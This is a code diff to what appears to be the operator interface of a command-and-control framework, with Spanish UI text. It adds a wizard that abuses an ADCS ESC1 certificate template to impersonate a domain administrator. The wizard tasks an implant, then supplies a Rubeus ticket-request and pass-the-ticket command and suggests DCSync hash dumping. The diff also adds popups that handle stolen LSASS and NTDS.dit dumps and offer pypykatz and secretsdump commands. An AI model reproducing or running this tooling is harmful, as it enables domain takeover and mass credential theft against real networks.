@@ -3552,6 +3552,44 @@ async function runCtxAction(act) {
       break;
     }
 
+    // ADCS ESC1 → DA — native certreq + Rubeus wizard (no Certify.exe needed)
+    case 'adcsEsc1Wizard': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      const ag = agents.find(a => a.id === aid);
+      const defDomain = (ag?.username||'').includes('\\') ? ag.username.split('\\')[0].toLowerCase() : '';
+      showQuickForm('ADCS ESC1 → DA (certreq + Rubeus)', [
+        {key:'ca',       label:'CA — formato FQDN\\\\Nombre-CA',         ph:'ca.north.local\\\\north-CA',       def:''},
+        {key:'template', label:'Template vulnerable (ESC1)',              ph:'User',                              def:'User'},
+        {key:'san',      label:'SAN — upn del usuario a impersonar',     ph:'administrator@north.local',        def:`administrator@${defDomain}`},
+        {key:'subject',  label:'Subject (CN del cert, cualquier valor)', ph:ag?.hostname||'pwned',              def:ag?.hostname||'pwned'},
+        {key:'dc',       label:'DC IP o hostname (para Rubeus asktgt)',  ph:'10.10.10.10',                      def:''},
+        {key:'domain',   label:'Dominio (para Rubeus)',                  ph:'north.local',                      def:defDomain},
+      ], vals => {
+        if (!vals.ca || !vals.san || !vals.dc) { toast('CA, SAN y DC son obligatorios', 'red'); return; }
+        // Step 1: native ADCS_REQUEST task
+        const arArgs = JSON.stringify({
+          ca: vals.ca,
+          template: vals.template || 'User',
+          subject: vals.subject || 'pwned',
+          san: vals.san,
+          out: 'C:\\Users\\Public\\esc1.pfx',
+        });
+        selectAgent(aid);
+        taskAgent(aid, 'ADCS_REQUEST', arArgs, '', `ESC1 certreq → ${vals.san}`);
+        // Step 2: show Rubeus command to use after cert arrives
+        const rubeusCmd = `asktgt /certificate:C:\\Users\\Public\\esc1.pfx /password: /domain:${vals.domain} /dc:${vals.dc} /nowrap /ptt`;
+        setTimeout(() => {
+          showInfoModal('ADCS ESC1 — Paso 2: Rubeus asktgt',
+            `El agente solicitará el certificado. Cuando aparezca el resultado con <b>cert_b64=</b>, ejecuta en el mismo agente:\n\n` +
+            `<code style="display:block;background:var(--bg3);padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;font-size:.82em">execute-assembly Rubeus.exe ${rubeusCmd}</code>\n\n` +
+            `Esto solicitará un TGT como <b>${esc(vals.san)}</b> e inyectará el ticket (/ptt).\n` +
+            `Después: <code>token whoami</code> para verificar, <code>dcsync</code> para volcar hashes.`
+          );
+        }, 800);
+      });
+      break;
+    }
+
     // Whisker — Shadow Credentials
     case 'whiskerOp': {
       const aid = act.id || activeAgent?.id; if (!aid) break;
@@ -4672,6 +4710,8 @@ function agentContextMenu(e, agentId) {
         null,
         {label:'Request certificate (ESC1)…', action:{fn:'certifyRequest', id}},
         {label:'Custom Certify command…',     action:{fn:'certifyCustom', id}},
+        null,
+        {label:'🎫  ESC1 → DA (nativo: certreq + Rubeus)…', action:{fn:'adcsEsc1Wizard', id}},
       ]},
       {_sub:'Shadow Creds (Whisker)', _icon:IC_GHOST, items:[
         {label:'List shadow creds…',   action:{fn:'whiskerOp', id, op:'list'}},
@@ -5121,6 +5161,10 @@ function handleSSE(ev) {
     }
   } else if (ev.type === 'BH_IMPORT_PROMPT') {
     bhShowImportPrompt(ev);
+  } else if (ev.type === 'LSASS_DUMP_PROMPT') {
+    showLsassPrompt(ev);
+  } else if (ev.type === 'NTDS_PROMPT') {
+    showNtdsPrompt(ev);
   }
 }
 
@@ -5161,6 +5205,52 @@ async function bhImportLocal(agentId, filename, promptId) {
   } catch(e) {
     toast('Error al importar: ' + e.message, 'red');
   }
+}
+
+// ── LSASS dump prompt ──────────────────────────────────────────────────────────
+function showLsassPrompt(ev) {
+  try {
+    const { filename, agent_id } = JSON.parse(ev.msg);
+    const id = 'lsass-prompt-' + Date.now();
+    const dl = `/api/agents/${agent_id}/files/${encodeURIComponent(filename)}`;
+    const cmd = `pypykatz lsa minidump ${filename}`;
+    const div = document.createElement('div');
+    div.id = id;
+    div.style.cssText = 'position:fixed;bottom:80px;right:20px;z-index:9999;background:var(--bg2);border:1px solid var(--red);border-radius:8px;padding:14px 18px;max-width:360px;box-shadow:0 4px 16px rgba(0,0,0,.4)';
+    div.innerHTML = `
+      <div style="font-weight:600;margin-bottom:6px;color:var(--red)">💾 LSASS dump recibido</div>
+      <div style="font-size:.85em;margin-bottom:8px;word-break:break-all;opacity:.85">${esc(filename)}</div>
+      <div style="font-size:.8em;background:var(--bg3);border-radius:4px;padding:6px 8px;margin-bottom:10px;font-family:monospace;word-break:break-all">${esc(cmd)}</div>
+      <div style="display:flex;gap:8px">
+        <a href="${dl}" download="${esc(filename)}" style="flex:1;background:var(--red);color:#fff;border:none;border-radius:5px;padding:6px 0;cursor:pointer;font-weight:600;text-align:center;text-decoration:none;font-size:.85em">Descargar</a>
+        <button onclick="navigator.clipboard.writeText(${JSON.stringify(cmd)});toast('Copiado','blue')" style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 0;cursor:pointer;font-size:.85em">Copiar cmd</button>
+        <button onclick="document.getElementById('${id}')?.remove()" style="background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 10px;cursor:pointer">✕</button>
+      </div>`;
+    document.body.appendChild(div);
+    setTimeout(() => document.getElementById(id)?.remove(), 90000);
+  } catch(_) {}
+}
+
+// ── NTDS dump prompt ───────────────────────────────────────────────────────────
+function showNtdsPrompt(ev) {
+  try {
+    const { filename, agent_id } = JSON.parse(ev.msg);
+    const id = 'ntds-prompt-' + Date.now();
+    const cmd = `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`;
+    const div = document.createElement('div');
+    div.id = id;
+    div.style.cssText = 'position:fixed;bottom:80px;right:20px;z-index:9999;background:var(--bg2);border:1px solid var(--orange,#e67e22);border-radius:8px;padding:14px 18px;max-width:380px;box-shadow:0 4px 16px rgba(0,0,0,.4)';
+    div.innerHTML = `
+      <div style="font-weight:600;margin-bottom:6px;color:var(--orange,#e67e22)">🗄️ NTDS archivo recibido</div>
+      <div style="font-size:.85em;margin-bottom:6px;opacity:.85">${esc(filename)} — espera ntds.dit + SYSTEM</div>
+      <div style="font-size:.8em;background:var(--bg3);border-radius:4px;padding:6px 8px;margin-bottom:10px;font-family:monospace;word-break:break-all">${esc(cmd)}</div>
+      <div style="display:flex;gap:8px">
+        <button onclick="navigator.clipboard.writeText(${JSON.stringify(cmd)});toast('Copiado','blue')" style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 0;cursor:pointer;font-size:.85em">Copiar cmd</button>
+        <button onclick="document.getElementById('${id}')?.remove()" style="background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 10px;cursor:pointer">✕</button>
+      </div>`;
+    document.body.appendChild(div);
+    setTimeout(() => document.getElementById(id)?.remove(), 90000);
+  } catch(_) {}
 }
 
 // ── API ────────────────────────────────────────────────────────────────────────
@@ -14376,6 +14466,22 @@ function showPrompt(title, label, defVal, onOk) {
   openModal('modal-prompt');
   setTimeout(() => inp.focus(), 60);
 }
+function showInfoModal(title, htmlContent) {
+  const id = 'info-modal-' + Date.now();
+  const div = document.createElement('div');
+  div.id = id;
+  div.style.cssText = 'position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.55)';
+  div.innerHTML = `<div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:24px 28px;max-width:580px;width:90%;max-height:80vh;overflow-y:auto;box-shadow:0 8px 32px rgba(0,0,0,.5)">
+    <div style="font-weight:700;font-size:1.05em;margin-bottom:14px;color:var(--accent)">${esc(title)}</div>
+    <div style="font-size:.88em;line-height:1.6;white-space:pre-wrap">${htmlContent}</div>
+    <div style="text-align:right;margin-top:18px">
+      <button onclick="document.getElementById('${id}').remove()" style="background:var(--accent);color:#000;border:none;border-radius:5px;padding:7px 20px;cursor:pointer;font-weight:600">OK</button>
+    </div>
+  </div>`;
+  div.addEventListener('click', e => { if (e.target === div) div.remove(); });
+  document.body.appendChild(div);
+}
+
 function showChoice(title, msg, actions) {
   document.getElementById('choice-title').textContent = title;
   document.getElementById('choice-msg').textContent   = msg;
